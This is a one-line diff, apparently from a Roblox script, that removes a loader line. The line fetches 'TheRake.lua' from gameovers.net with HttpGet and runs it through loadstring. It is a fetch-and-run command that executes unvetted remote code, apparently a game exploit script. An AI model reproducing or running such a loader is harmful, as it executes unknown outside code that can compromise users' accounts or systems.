@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/The%20Rake/TheRake.lua", true))()
